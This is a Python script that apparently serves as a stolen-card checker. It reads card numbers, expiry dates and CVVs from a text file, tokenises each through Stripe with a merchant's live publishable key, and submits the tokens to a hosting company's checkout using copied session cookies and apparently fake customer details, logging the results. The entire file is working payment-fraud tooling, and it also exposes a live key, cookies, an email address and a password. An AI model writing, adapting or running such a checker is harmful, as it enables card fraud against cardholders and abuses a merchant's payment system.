import subprocess
import json
import subprocess
import json

def stripe(cc, mes, ano, cvv):
    command = f"""curl 'https://api.stripe.com/v1/payment_methods' \
  -H 'authority: api.stripe.com' \
  -H 'accept: application/json' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'origin: https://js.stripe.com' \
  -H 'referer: https://js.stripe.com/' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-site' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  --data-raw 'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=da30d052-f983-4bbc-b369-8b98251ea9b73c357c&sid=807a5a50-c743-485e-93a3-08fc88cb801f4834ba&pasted_fields=number&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+split-card-element&time_on_page=106426&key=pk_live_51JnfD0IxzC5X2alIWgLJijldZHrTGkDLdazqECEDpbaTKx2jYYHri6rIZofygpBxAHIrhTLzjM57Ir4QvnByLgM400hbx4Pige' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    payment_method_id = json_output.get('id')  # Use get() to handle missing 'id' field
    if payment_method_id is None:
        print("Payment method ID not found in response.")
    else:
        print(payment_method_id)
    return payment_method_id

# stripe(5357386252340543,'09',2026,523)

def check(id):
    command = f"""curl 'https://manage.digirdp.com/index.php?rp=/stripe/payment/intent' \
  -H 'authority: manage.digirdp.com' \
  -H 'accept: application/json, text/javascript, */*; q=0.01' \
  -H 'accept-language: en-IN,en;q=0.9' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'cookie: _fbp=fb.1.1689487029979.861433298; _ga=GA1.2.1527216852.1689487030; _gid=GA1.2.491075139.1689487030; __insp_wid=1033028302; __insp_nv=true; __insp_targlpu=aHR0cHM6Ly9kaWdpcmRwLmNvbS8%3D; __insp_targlpt=QnV5IENoZWFwIFJEUCAtIFNoYXJlZCBVU0EvVUsvTkwgUkRQIEAzLjk5JC9N; __insp_sid=1870474227; __insp_uid=1933221031; __insp_slim=1689487037606; WHMCSy551iLvnhYt7=8e1d1aceb62631cd0e8b01cf61ec6fb4; __insp_pad=2; _ga=GA1.3.1527216852.1689487030; twk_idm_key=2CLkLMAq8NisYFWSLAIZb; __stripe_mid=da30d052-f983-4bbc-b369-8b98251ea9b73c357c; __stripe_sid=807a5a50-c743-485e-93a3-08fc88cb801f4834ba; G_ENABLED_IDPS=google; TawkConnectionTime=0; twk_uuid_5d4c52d37d27204601c9ff11=%7B%22uuid%22%3A%221.70gU4QfSaqxjKo4mq2P2SqbSCvs5nUqeMWzmATCkmimW15Puqonm9SUqzmQelLznu09ivHe48URP49hOsJyPCfXMFrvWmIKvBcnxiXXel3HwX8zjseot%22%2C%22version%22%3A3%2C%22domain%22%3A%22digirdp.com%22%2C%22ts%22%3A1689487058208%7D; _ga_4MJCEZQFN5=GS1.3.1689487043.1.1.1689487096.0.0.0' \
  -H 'origin: https://manage.digirdp.com' \
  -H 'referer: https://manage.digirdp.com/cart.php?a=checkout' \
  -H 'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36' \
  -H 'x-requested-with: XMLHttpRequest' \
  --data-raw 'token=d294c14068c98ded32098d18458cd272715b8a32&submit=true&loginemail=&loginpassword=&custtype=new&firstname=Vrishni&lastname=Pkd&email=pd7886705%40gmail.com&country-calling-code-phonenumber=91&phonenumber=3567+563+256&companyname=Appu+Pkd&address1=178+%2Cshop+No.%2C+Rangari+Bldg%2C+Dadasaheb+Phalke+Road%2C+Dadar(e)&address2=St+Cross+Lane%2C+Chowpatty&city=Mumbai&state=Maharashtra&postcode=400059&country=IN&password=T*EGi*%7Dy4fQ%2B&password2=T*EGi*%7Dy4fQ%2B&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&marketingoptin=1&notes=&accepttos=on&payment_method_id={id}' \
  --compressed"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, _ = process.communicate()
    command_output = output.decode()
    json_output = json.loads(command_output)
    
    print(json_output)
    return json_output



# Open the text file
with open('cc.txt', 'r') as file:
    # Read each line in the file
    for line in file:
        # Remove leading/trailing whitespaces and split the line by '|'
        values = line.strip().split('|')
        
        # Check if the line has enough values
        if len(values) < 4:
            print(f"Ignoring line: {line}")
            continue
        
        # Store the values in separate variables
        value1 = values[0]
        value2 = values[1]
        value3 = values[2]
        value4 = values[3]
        
        idd = stripe(value1, value2, value3, value4)
        da = check(idd)
        with open("output.txt", 'a') as output_file:
            output_file.write(str(line) + str(da) + '\n')
